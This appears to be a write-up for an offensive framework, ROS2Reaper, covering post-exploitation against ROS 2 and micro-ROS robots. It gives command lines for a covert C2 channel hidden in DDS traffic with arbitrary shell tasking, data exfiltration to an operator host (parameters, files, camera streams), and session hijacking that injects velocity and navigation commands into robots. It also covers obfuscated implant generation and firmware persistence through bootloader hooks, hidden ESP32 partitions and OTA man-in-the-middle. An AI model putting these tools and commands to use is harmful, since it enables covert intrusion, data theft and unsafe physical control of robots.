Where We Left Off

Previous phases covered the full attack surface of standard ROS 2 deployments — DDS/RTPS participant discovery, topic injection, node impersonation, amplification, ROS 1 legacy attacks, and a full ICS/OT bridge analysis layer covering Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT Greengrass, and Shodan-driven internet-wide exposure mapping.

04
POST-EXPLOITATION / C2

Covert command-and-control channel tunneled inside DDS/RTPS traffic. Payloads disguised as normal ROS infrastructure messages. Invisible to shallow network monitoring.

architecture

Hiding in the DDS Bus

The standard assumption in ROS 2 environments is that DDS traffic is internal infrastructure noise — /rosout, /diagnostics, /parameter_events. Network monitors that don't perform deep RTPS inspection treat all of it as benign. Phase 4 weaponizes that assumption.

C2 payloads are XOR-encoded and wrapped in valid RTPS DATA submessages, masquerading as eProsima Fast DDS. The GUID prefix rotates per session — no persistent fingerprint. Beacon intervals are jittered ±25% to defeat timing-based detection.

c2-server // operator side

Listens for beacon check-ins and provides an interactive shell for session management and tasking. Multiple sessions tracked concurrently — useful when you have beacons across a robot fleet.

bash
# start C2 server on domain 0
python3 ros2reaper.py c2-server --domain-id 0 --c2-key opskey -o session_log.json --skip-auth

# interactive shell
sessions                          # list active sessions
use <session_id>                  # attach to session (partial ID ok)
task shell ros2 topic list        # arbitrary command execution
task sysinfo                      # fingerprint the host
task ros_enum                     # enumerate nodes/topics/params
task topic_read /cmd_vel          # intercept velocity commands live

c2-beacon // implant side

Deployed on the compromised ROS 2 host after initial access. Configurable check-in interval, TTL self-termination, matching XOR key. Pure Python 3.8+ — no ROS dependencies on the target.

bash
python3 ros2reaper.py c2-beacon --target <operator_ip> --c2-key opskey \
    --c2-interval 15 --c2-ttl 50 --skip-auth

// supported tasks

taskdescription
shell <cmd>Execute arbitrary shell command, return stdout/stderr
sysinfoCollect hostname, user, PID, ROS distro, domain ID
ros_enumEnumerate ROS 2 nodes, topics, and parameters via CLI
topic_read <topic>Read live messages from a specified ROS 2 topic

c2-exfil // data exfiltration

Payloads are automatically chunked into 1400-byte segments (within UDP MTU) and reassembled on the operator side via c2-recv. Covers environment variables, filesystem reads up to 64KB, full ROS 2 parameter dumps, and raw topic stream captures.

bash
# dump all ROS 2 parameters from target
python3 ros2reaper.py c2-exfil --target <op_ip> --exfil-mode params --skip-auth

# capture /camera/image_raw for 10 seconds
python3 ros2reaper.py c2-exfil --target <op_ip> --exfil-mode topic \
    --topic /camera/image_raw --skip-auth

# receive and save on operator side
python3 ros2reaper.py c2-recv --c2-session <id> -o ros_params.txt --skip-auth

5A
micro-ROS / DDS-XRCE

XRCE Agent discovery, traffic profiling, client session hijacking, implant generation, firmware persistence, and C2 dispatching for constrained MCU targets.

background

The Embedded Blind Spot

Standard ROS 2 runs on full Linux hosts with DDS middleware baked in. That's the well-lit part of the attack surface. The part that doesn't get talked about as much is everything downstream: constrained MCU-based nodes — Arduinos, STM32s, ESP32s, nRF52s — handling low-level actuation and sensor work in production robotics deployments.

These devices run micro-ROS, which doesn't implement DDS natively. They speak DDS-XRCE (eXtremely Resource Constrained Environments) — a lightweight wire protocol designed for hardware with kilobytes of RAM. An XRCE Agent bridge (a separate Linux process) sits between the MCU nodes and the full ROS 2 graph, translating between XRCE and standard DDS.

// default ports

XRCE Agents listen on UDP/8888 by default, with alternative instances on ports 7400-7409. Most deployments leave these open with no authentication.

Control the agent interaction and you can inject into any topic the MCU nodes publish or subscribe to, impersonate client sessions, and push commands to embedded hardware directly driving physical actuators.

module overview

microros_agent.py

XRCE Agent discovery via minimal HEARTBEAT probes. Fingerprints vendor/version. Enumerates connected MCU participants.

xrce_traffic_analysis.py

Passive XRCE traffic capture and behavioral baseline. Packet size distributions, timing, heartbeat intervals, per-session stats.

microros_client_hijack.py

Spoofed XRCE client session against a discovered agent. Injects Twist, PoseStamped, or raw CDR payload messages.

microros_implant.py

Generates complete micro-ROS C2 implant source for Arduino, C++, or Python targets. Obfuscation and decoy code injection.

microros_persistence.py

Firmware-level persistence: library patching, bootloader hooks, firmware injection, ESP32 partition hijack, OTA MITM.

c2_dispatcher.py

Interactive operator console. Routes commands to deployed implants via DDS topics or live agents via XRCE hijacking.

microros-agent // discovery & enumeration

Uses minimal XRCE HEARTBEAT packets to probe for agents without triggering the full session handshake. Fingerprints vendor and version from response headers. --xrce-enumerate lists connected MCU participants — useful for mapping accessible embedded hardware before going active.

bash
# sweep subnet for all XRCE agents
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json

# enumerate connected MCU participants
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth

# scan all common XRCE ports (8888, 7400-7409)
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth

xrce-traffic // behavioral profiling

Passive baseline before touching anything. Packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, per-session stats. Output feeds into sizing and timing subsequent injections to blend with normal MCU traffic.

bash
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
    --duration 60 -o baseline.json --pcap xrce_capture.pcap --skip-auth

xrce-hijack // client session hijacking

Creates a spoofed XRCE client session against a discovered agent and injects malicious DDS messages. Session ID is configurable — useful after profiling legitimate client IDs in use on the network.

modemessage typeuse case
twistgeometry_msgs/TwistRobot velocity command injection — spin, stop, ramp speed
navgeometry_msgs/PoseStampedNavigation goal hijack — send robot to arbitrary coordinates
rawArbitrary CDR payloadInject any CDR-encoded message from hex string or file
bash
# velocity injection
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth

# navigation goal hijack
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth

# raw CDR payload injection
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
    --topic /cmd_vel --payload-hex 0000803f00000000... --count 5 --skip-auth

uros-implant // C2 implant generation

Generates complete micro-ROS C2 implant source for three target platforms. Beacons periodically to a C2 callback topic, accepts tasking commands over DDS. Optional comment stripping and decoy code injection for basic static analysis evasion.

platformoutputuse case
cpp.cpp (ROS 2 node)Full ROS 2 host or cross-compiled MCU target
arduino.ino (Arduino sketch)Arduino-compatible boards with Ethernet/WiFi
python.py (rclpy node)Rapid prototyping, lab testing, soft implants
bash
# Arduino implant — 3-second beacon interval
python3 ros2reaper.py uros-implant --platform arduino \
    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth

# C++ implant with obfuscation + manifest export
python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
    --beacon-interval 10000 --manifest implants.json --skip-auth

uros-persist // firmware-level persistence

Standard Linux post-exploitation persistence is well-understood. On embedded hardware it's a different problem. Five methods cover from soft (library patching, survives app reinstalls) to hard (bootloader hooks and partition modifications that survive OS wipes and factory resets).

methodsurvivesmechanism
library_patchApp reinstallsInjects beacon code into the micro-ROS client library at .elf level
bootloaderOS wipeHooks bootloader entry to execute implant before firmware loads
firmware_injectNormal updatesAppends implant shellcode to an existing firmware image
partitionFactory resetCreates a hidden partition in the ESP32 partition table
ota_hijackUpdates (MITM)Generates OTA server config to serve malicious firmware on update
bash
# library patch against micro-ROS .elf firmware
python3 ros2reaper.py uros-persist --persist-method library_patch \
    --target firmware.elf --implant-id sensor_01 --implant-hex deadbeef... --skip-auth

# ESP32 hidden partition
python3 ros2reaper.py uros-persist --persist-method partition \
    --target partitions.csv --implant-file implant.bin \
    --partition-name implant_hidden --skip-auth

# OTA MITM config generation
python3 ros2reaper.py uros-persist --persist-method ota_hijack \
    --implant-id sensor_01 --ota-server ota.target.local --skip-auth

uros-c2 // phase 5A dispatcher

Operator console for Phase 5A ops. Routes commands to deployed implants via DDS topics or directly to live XRCE agents via the hijacking module. Tracks implant registry, manages task queues, aggregates telemetry. Interactive or batch mode.

bash
python3 ros2reaper.py uros-c2 --log-file session.log --skip-auth

Where the Framework Stands

With Phase 5A complete, ROS2Reaper covers the full stack from internet-exposed DDS endpoints down to embedded MCU firmware. The five-phase breakdown reflects the actual attack lifecycle in robotic environments.

phasescopestatus
1 -- ReconDDS/RTPS discovery, fingerprinting, enumeration, SROS2 auditSTABLE
2 -- ExploitationTopic injection, node impersonation, RTPS amplification, ROS 1STABLE
3 -- ICS/OT BridgeModbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT, ShodanSTABLE
